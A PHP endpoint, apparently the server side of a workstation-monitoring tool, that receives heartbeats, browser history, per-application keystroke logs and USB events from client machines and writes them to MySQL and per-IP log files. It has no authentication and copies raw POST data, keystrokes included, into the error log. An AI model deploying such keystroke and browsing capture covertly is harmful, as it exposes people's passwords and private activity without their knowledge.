<?php

//include_once "database.php";
//include_once "common.php";

include_once "config.inc.php";
include_once "./includes/json.lib.php";

$config = new JConfig();

// Use mysqli instead of mysql_* functions
$mysqli = new mysqli($config->dbhost, $config->dbuser, $config->dbpassword, $config->dbname);

if ($mysqli->connect_error) {
    die("Could not connect MySQL: " . $mysqli->connect_error);
}

$mysqli->set_charset('utf8');

$ipaddr = $_SERVER['REMOTE_ADDR'];
$ipitems = explode(".", $ipaddr);

// Debug logging
error_log("eventhandler.php called - IP: $ipaddr");
error_log("POST data: " . json_encode($_POST));
error_log("Content-Type: " . ($_SERVER['CONTENT_TYPE'] ?? 'not set'));

$appVersion = isset($_POST['Version']) ? $_POST['Version'] : "1.0";
$appEvent = isset($_POST['Event']) ? $_POST['Event'] : "none";
$username = isset($_POST['Username']) ? $_POST['Username'] : "";

error_log("Initial appEvent: $appEvent, appVersion: $appVersion, username: $username");

$retObj = ['Status' => 'OK'];

// Check if this is a Tic event (can be either form data or JSON)
$isTicEvent = false;
$macaddress = "";
$username = "";

// First check if it's a Tic event in form data (legacy support)
if ($appEvent == 'Tic') {
    $isTicEvent = true;
    $macaddress = isset($_POST['MacAddress']) ? $_POST['MacAddress'] : "";
    $username = isset($_POST['Username']) ? $_POST['Username'] : "";
} else {
    // Check if it's JSON data
    $json = file_get_contents('php://input');
    $data = json_decode($json, true);

    if ($data) {
        $appEvent = $data['Event'];
        $appVersion = $data['Version'];
        $macaddress = $data['MacAddress'] ?? '';
        $username = $data['Username'] ?? '';
        
        // Check if this is a Tic event in JSON format
        if ($appEvent == 'Tic') {
            $isTicEvent = true;
        } else {
            // Update username if provided in any event
            if (!empty($username)) {
                updateUsernameFromEvent($mysqli, $username);
            }
            
            // Handle different event types
            switch ($appEvent) {
                case 'BrowserHistory':
                    $browserHistories = $data['BrowserHistories'];
                    // Process Browser History
                    addBrowserHistory($mysqli, $browserHistories);
                    break;
                case 'KeyLog':
                    $keyLogs = $data['KeyLogs'];
                    // Process key logs
                    addKeyLogs($mysqli, $keyLogs);
                    break;
                case 'USBLog':
                    $usbLogs = $data['USBLogs'];
                    // Process USB logs
                    error_log("USBLog event received: " . json_encode($data));
                    addUSBLogs($mysqli, $usbLogs);
                    break;
            }
        }
    } else {
        // Handle JSON decode error
        http_response_code(400);
        echo json_encode(['error' => 'Invalid JSON']);
        $mysqli->close();
        return;
    }
}

// Handle Tic event (from either form data or JSON)
if ($isTicEvent) {
    $lastBrowserTic = addMonitorTic($ipaddr, $macaddress, $appVersion, $username, $mysqli);
    $retObj['LastBrowserTic'] = $lastBrowserTic;
}

$retJSON = json_encode($retObj);

echo $retJSON;
$mysqli->close();


function addMonitorTic($ip, $macaddr, $version, $username, $mysqli)
{
    // Debug logging
    error_log("addMonitorTic called - IP: $ip, MAC: $macaddr, Version: $version, Username: $username");
    
    $ip_info = getClientInfo($mysqli);

    if ($ip_info == null) {
        error_log("addMonitorTic failed - getClientInfo returned null");
        return;
    }

    $monitor_ip_id = $ip_info['id'];
    $lastBrowserTic = $ip_info['last_browser_tic'] ? strtotime($ip_info['last_browser_tic']) : time();
    
    error_log("addMonitorTic - Monitor ID: $monitor_ip_id, Last Browser Tic: $lastBrowserTic");

    // Build the SQL update statement
    $update_fields = [
        "`os_status`=1",
        "`monitor_status`=1", 
        "last_monitor_tic = NOW()",
        "`app_version`='" . $mysqli->real_escape_string($version) . "'"
    ];
    
    // Add MAC address if provided
    if (strlen($macaddr) > 11) {
        $update_fields[] = "`mac_address`='" . $mysqli->real_escape_string($macaddr) . "'";
    }
    
    // Add username if provided and valid
    if (!empty($username) && strlen($username) >= 2 && strlen($username) <= 50) {
        // Check if username already exists for another IP
        $stmt = $mysqli->prepare("SELECT id FROM tbl_monitor_ips WHERE username = ? AND id != ?");
        $stmt->bind_param("si", $username, $monitor_ip_id);
        $stmt->execute();
        $result = $stmt->get_result();
        
        if ($result->num_rows == 0) {
            // Username is unique, safe to update
            $update_fields[] = "`username`='" . $mysqli->real_escape_string($username) . "'";
        }
    }
    
    $sql = "UPDATE tbl_monitor_ips SET " . implode(", ", $update_fields) . " WHERE id = '" . $monitor_ip_id . "'";
    error_log("addMonitorTic - SQL: $sql");
    
    $result = $mysqli->query($sql);
    if ($result) {
        error_log("addMonitorTic - Update successful, affected rows: " . $mysqli->affected_rows);
    } else {
        error_log("addMonitorTic - Update failed: " . $mysqli->error);
    }

    return $lastBrowserTic;
}

function updateUsernameFromEvent($mysqli, $username) {
    $client_ip = $_SERVER['REMOTE_ADDR'];
    
    // Sanitize username
    $username = trim($username);
    if (strlen($username) < 2 || strlen($username) > 50) {
        return false;
    }
    
    // Check if username already exists for another IP
    $stmt = $mysqli->prepare("SELECT id FROM tbl_monitor_ips WHERE username = ? AND ip_address != ?");
    $stmt->bind_param("ss", $username, $client_ip);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if ($result->num_rows > 0) {
        return false; // Username already exists
    }
    
    // Update username for this IP
    $stmt = $mysqli->prepare("UPDATE tbl_monitor_ips SET username = ?, updated_at = NOW() WHERE ip_address = ?");
    $stmt->bind_param("ss", $username, $client_ip);
    
    if ($stmt->execute() && $stmt->affected_rows > 0) {
        return true;
    }
    
    return false;
}

function addBrowserHistory($mysqli, $browserHistories)
{
    global $logs_dir_path;
    
    $ip_info = getClientInfo($mysqli);

    if ($ip_info == null) {
        return;
    }

    $type = $ip_info['type'];
    $user_name = $ip_info['name'];
    $ip_id = $ip_info['id'];

    // Get IP-based directory paths
    $ip_paths = getIPBasedPaths($ip_id, $_SERVER['REMOTE_ADDR']);

    // browser history
    if ($browserHistories) {
        if (count ($browserHistories) > 0) {
            $lastDate = null;
            foreach ($browserHistories as $browserHistory) {
                $date = $browserHistory['date'];
                $browser = $browserHistory['browser'];
                $url = $browserHistory['url'];
                $title = $browserHistory['title'];
                $lastVisit = $browserHistory['last_visit'];

                if ($lastDate == null || $lastDate < $date) {
                    $lastDate = $date;
                }

                $dir_date = date('Y-m-d', strtotime($date));

                $hour = date('H', strtotime($date));
                $mins = date('i', strtotime($date));
                $secs = date('s', strtotime($date));
                $subdir = $hour . '.' . ($mins >= 30 ? '30' : '00');

                $log_dir = $ip_paths['logs'] . $dir_date . '/' . $subdir . '/';
                if (!file_exists($log_dir)) {
                    mkdir($log_dir, 0755, true);
                }
                
                $filePath = $log_dir . "browser_history.txt";
                $content = "Date: {$date} | Browser: {$browser} | URL: {$url} | Title: {$title} | Last Visit: {$lastVisit}\n";
                file_put_contents($filePath, $content, FILE_APPEND);
            }
        }
    }
}

function addKeyLogs($mysqli, $keyLogs)
{
    global $logs_dir_path;
    
    $ip_info = getClientInfo($mysqli);

    if ($ip_info == null) {
        return;
    }

    $type = $ip_info['type'];
    $user_name = $ip_info['name'];
    $ip_id = $ip_info['id'];

    // Get IP-based directory paths
    $ip_paths = getIPBasedPaths($ip_id, $_SERVER['REMOTE_ADDR']);

    // key logs
    if ($keyLogs) {
        if (count ($keyLogs) > 0) {
            // $keyLogs is already an array from json_decode, no need to decode again
            foreach ($keyLogs as $keyLog) {
                $date = $keyLog['date'];
                $application = $keyLog['application'];
                $key = $keyLog['key'];

                $dir_date = date('Y-m-d', strtotime($date));

                $hour = date('H', strtotime($date));
                $mins = date('i', strtotime($date));
                $secs = date('s', strtotime($date));
                $subdir = $hour . '.' . ($mins >= 30 ? '30' : '00');

                $log_dir = $ip_paths['logs'] . $dir_date . '/' . $subdir . '/';
                if (!file_exists($log_dir)) {
                    mkdir($log_dir, 0755, true);
                }
                
                $filePath = $log_dir . "key_logs.txt";
                $content = "Date: {$date} | Application: {$application} | Key: {$key}\n";
                file_put_contents($filePath, $content, FILE_APPEND);
            }
        }
    }
}

function addUSBLogs($mysqli, $usbLogs)
{
    global $logs_dir_path;
    
    error_log("addUSBLogs called with: " . json_encode($usbLogs));
    
    $ip_info = getClientInfo($mysqli);

    if ($ip_info == null) {
        error_log("getClientInfo returned null");
        return;
    }

    $type = $ip_info['type'];
    $user_name = $ip_info['name'];
    $ip_id = $ip_info['id'];

    // Get IP-based directory paths
    $ip_paths = getIPBasedPaths($ip_id, $_SERVER['REMOTE_ADDR']);
    
    error_log("IP paths: " . json_encode($ip_paths));

    // USB logs
    if ($usbLogs) {
        // $usbLogs is already an array from json_decode, no need to decode again
        if (count ($usbLogs) > 0) {
            foreach ($usbLogs as $usbLog) {
                $date = $usbLog['date'];
                $device_name = $usbLog['device_name'];
                $action = $usbLog['action'];

                $dir_date = date('Y-m-d', strtotime($date));

                $hour = date('H', strtotime($date));
                $mins = date('i', strtotime($date));
                $secs = date('s', strtotime($date));
                $subdir = $hour . '.' . ($mins >= 30 ? '30' : '00');

                $log_dir = $ip_paths['logs'] . $dir_date . '/' . $subdir . '/';
                if (!file_exists($log_dir)) {
                    mkdir($log_dir, 0755, true);
                }
                
                $filePath = $log_dir . "usb_logs.txt";
                $content = "Date: {$date} | Device: {$device_name} | Action: {$action}\n";
                file_put_contents($filePath, $content, FILE_APPEND);
                error_log("USB log written to: " . $filePath);
            }
        }
    }
}